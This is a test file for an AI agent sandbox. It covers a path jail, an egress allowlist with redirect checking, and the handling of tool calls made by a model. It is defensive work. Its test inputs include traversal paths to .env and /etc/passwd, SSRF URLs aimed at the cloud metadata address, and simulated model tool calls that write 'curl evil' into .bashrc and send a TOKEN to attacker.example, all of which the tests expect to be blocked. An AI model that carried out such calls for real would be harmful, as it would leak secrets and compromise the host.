const { createModel } = require('@dojo/ai');

const POLICY = { allowedHosts: ['registry.npmjs.org', 'docs.example.com', '*.github.com'] };

function fakeResponse(status: number, body: string, location: string | null = null) {
  return { status, headers: { get: (name: string) => (name.toLowerCase() === 'location' ? location : null) }, text: async () => body };
}

test('createJail resolves paths inside the root and rejects traversal, absolute escapes, sibling prefixes and NUL bytes', async () => {
  const jail = mod.createJail('workspace');
  expect(jail.root).toBe('/app/workspace');
  expect(jail.resolve('notes/todo.md')).toBe('/app/workspace/notes/todo.md');
  expect(jail.resolve('./notes/../src/index.ts')).toBe('/app/workspace/src/index.ts');
  expect(jail.resolve('.')).toBe('/app/workspace');
  expect(jail.resolve('/app/workspace/src/a.ts')).toBe('/app/workspace/src/a.ts');
  for (const escape of ['../secrets.txt', 'notes/../../.env', '/etc/passwd', '/app/workspace-secrets/key.pem', '/app/workspace/../app/.env', '/app']) {
    const error = await captureError(() => jail.resolve(escape));
    expect(error).toBeInstanceOf(mod.SandboxError);
    expect(error.code).toBe('path_escape');
  }
  for (const invalid of ['', 'notes\0.md']) {
    expect((await captureError(() => jail.resolve(invalid))).code).toBe('invalid_path');
  }
});

test('the jail reads, writes with missing parent folders and lists inside the root, and never touches the disk outside it', async () => {
  writeFiles({ 'workspace/src/index.ts': 'export {};', 'workspace/README.md': '# Shop', '.env': 'TOKEN=secret', 'workspace-secrets/key.pem': 'KEY' });
  const jail = mod.createJail('/app/workspace/');
  expect(await jail.readFile('README.md')).toBe('# Shop');
  await jail.writeFile('reports/2026/summary.md', 'ok');
  expect(fs.readFileSync('/app/workspace/reports/2026/summary.md', 'utf8')).toBe('ok');
  expect(await jail.list()).toEqual(['README.md', 'reports', 'src']);
  expect(await jail.list('src')).toEqual(['index.ts']);
  expect((await captureError(jail.readFile('missing.md'))).code).toBe('ENOENT');
  expect((await captureError(jail.readFile('../.env'))).code).toBe('path_escape');
  expect((await captureError(jail.writeFile('../workspace-secrets/key.pem', 'overwritten'))).code).toBe('path_escape');
  expect((await captureError(jail.list('..'))).code).toBe('path_escape');
  expect(fs.readFileSync('/app/workspace-secrets/key.pem', 'utf8')).toBe('KEY');
});

test('checkEgress allows exact hosts and strict subdomains of wildcard entries only', () => {
  expect(mod.checkEgress('https://registry.npmjs.org/zod', POLICY)).toEqual({ allowed: true, host: 'registry.npmjs.org' });
  expect(mod.checkEgress('https://API.GitHub.com/repos', POLICY)).toEqual({ allowed: true, host: 'api.github.com' });
  expect(mod.checkEgress('https://docs.example.com./guide', POLICY)).toEqual({ allowed: true, host: 'docs.example.com' });
  expect(mod.checkEgress('https://github.com/', POLICY)).toEqual({ allowed: false, reason: 'not_allowlisted' });
  expect(mod.checkEgress('https://evilgithub.com/', POLICY)).toEqual({ allowed: false, reason: 'not_allowlisted' });
  expect(mod.checkEgress('https://registry.npmjs.org.attacker.example/zod', POLICY)).toEqual({ allowed: false, reason: 'not_allowlisted' });
  expect(mod.checkEgress('https://docs.example.com:8443/', POLICY)).toEqual({ allowed: false, reason: 'port' });
  expect(mod.checkEgress('http://docs.example.com/', { ...POLICY, allowedSchemes: ['https:', 'http:'] })).toEqual({ allowed: true, host: 'docs.example.com' });
});

test('checkEgress refuses bad schemes, credentials, IP literals in every spelling and localhost, in the documented order', () => {
  const reasons = (urls: string[]) => urls.map((url) => mod.checkEgress(url, POLICY));
  expect(reasons(['not a url', 'docs.example.com/guide'])).toEqual([{ allowed: false, reason: 'invalid_url' }, { allowed: false, reason: 'invalid_url' }]);
  expect(reasons(['http://docs.example.com/', 'file:///etc/passwd', 'ftp://registry.npmjs.org/', 'http://127.0.0.1/'])).toEqual(Array(4).fill({ allowed: false, reason: 'scheme' }));
  expect(reasons(['https://user:secret@docs.example.com/', 'https://token@registry.npmjs.org/'])).toEqual(Array(2).fill({ allowed: false, reason: 'credentials' }));
  expect(
    reasons(['https://127.0.0.1/', 'https://0x7f000001/', 'https://2130706433/', 'https://127.1/', 'https://017700000001/', 'https://169.254.169.254/latest/meta-data/', 'https://[::1]/', 'https://[fd00::1]/']),
  ).toEqual(Array(8).fill({ allowed: false, reason: 'ip_literal' }));
  expect(reasons(['https://localhost/', 'https://LOCALHOST./admin', 'https://admin.localhost/'])).toEqual(Array(3).fill({ allowed: false, reason: 'local_host' }));
  expect(mod.checkEgress('https://localhost/', { allowedHosts: ['localhost'] })).toEqual({ allowed: false, reason: 'local_host' });
});

test('the fetch tool checks every URL before fetching it, including each redirect hop', async () => {
  const fetch = fn(async (url: string) => {
    if (url === 'https://docs.example.com/old') return fakeResponse(301, '', '/new');
    if (url === 'https://docs.example.com/new') return fakeResponse(200, 'docs body');
    if (url === 'https://docs.example.com/metadata') return fakeResponse(302, '', 'http://169.254.169.254/latest/meta-data/');
    if (url === 'https://docs.example.com/loop') return fakeResponse(307, '', 'https://docs.example.com/loop');
    return fakeResponse(404, 'not found');
  });
  const fetchUrl = mod.createFetchTool({ fetch, policy: POLICY });

  expect(await fetchUrl('https://docs.example.com/old')).toEqual({ status: 200, url: 'https://docs.example.com/new', body: 'docs body' });
  expect(fetch.mock.calls).toEqual([
    ['https://docs.example.com/old', { redirect: 'manual' }],
    ['https://docs.example.com/new', { redirect: 'manual' }],
  ]);
  expect(await fetchUrl('https://docs.example.com/missing')).toEqual({ status: 404, url: 'https://docs.example.com/missing', body: 'not found' });

  const denied = await captureError(fetchUrl('https://2130706433/admin'));
  expect(denied).toBeInstanceOf(mod.SandboxError);
  expect(denied.code).toBe('egress_denied');
  expect(denied.message).toMatch(/ip_literal/);
  expect(fetch).toHaveBeenCalledTimes(3);

  expect((await captureError(fetchUrl('https://docs.example.com/metadata'))).code).toBe('egress_denied');
  expect(fetch).toHaveBeenCalledTimes(4);

  expect((await captureError(fetchUrl('https://docs.example.com/loop'))).code).toBe('egress_denied');
  expect(fetch).toHaveBeenCalledTimes(8);
});

test('executeToolCall runs the model’s tool calls inside the sandbox and turns every refusal into an Error tool message', async () => {
  writeFiles({ 'workspace/README.md': '# Shop', '.env': 'TOKEN=secret' });
  const jail = mod.createJail('workspace');
  const fetch = fn(async () => fakeResponse(200, '{"name":"zod"}'));
  const fetchUrl = mod.createFetchTool({ fetch, policy: POLICY });
  const model = createModel();
  fakeModel.reply(
    respond.toolCalls([
      { name: 'read_file', arguments: { path: 'README.md' } },
      { name: 'write_file', arguments: { path: 'notes/plan.md', content: 'step 1' } },
      { name: 'list_files', arguments: {} },
      { name: 'fetch_url', arguments: { url: 'https://registry.npmjs.org/zod' } },
    ]),
    respond.toolCalls([
      { name: 'read_file', arguments: { path: '../.env' } },
      { name: 'write_file', arguments: { path: '/app/.bashrc', content: 'curl evil' } },
      { name: 'fetch_url', arguments: { url: 'https://attacker.example/?q=TOKEN' } },
      { name: 'read_file', arguments: { path: 'missing.md' } },
    ]),
    respond.invalidToolArguments('read_file'),
    respond.unknownTool('delete_everything'),
  );
  const request = { messages: [{ role: 'user', content: 'Summarize the project.' }] };

  const allowed = await model.generate(request);
  const results = [];
  for (const toolCall of allowed.toolCalls) results.push(await mod.executeToolCall(toolCall, { jail, fetchUrl }));
  expect(results.map((message: { role: string; toolCallId: string }) => [message.role, message.toolCallId])).toEqual(allowed.toolCalls.map((call: { id: string }) => ['tool', call.id]));
  expect(results[0].content).toBe('# Shop');
  expect(results[1].content).toMatch(/notes\/plan\.md/);
  expect(results[2].content.split('\n')).toEqual(['README.md', 'notes']);
  expect(results[3].content).toBe('{"name":"zod"}');
  expect(fs.readFileSync('/app/workspace/notes/plan.md', 'utf8')).toBe('step 1');

  const refused = await model.generate(request);
  const refusals = [];
  for (const toolCall of refused.toolCalls) refusals.push(await mod.executeToolCall(toolCall, { jail, fetchUrl }));
  expect(refusals[0].content).toMatch(/^Error:.*path_escape/);
  expect(refusals[1].content).toMatch(/^Error:.*path_escape/);
  expect(refusals[2].content).toMatch(/^Error:.*egress_denied/);
  expect(refusals[3].content).toMatch(/^Error:/);
  expect(fs.existsSync('/app/.bashrc')).toBe(false);
  expect(fetch).toHaveBeenCalledTimes(1);

  for (const response of [await model.generate(request), await model.generate(request)]) {
    const message = await mod.executeToolCall(response.toolCalls[0], { jail, fetchUrl });
    expect(message.toolCallId).toBe(response.toolCalls[0].id);
    expect(message.content).toMatch(/^Error:/);
  }
});
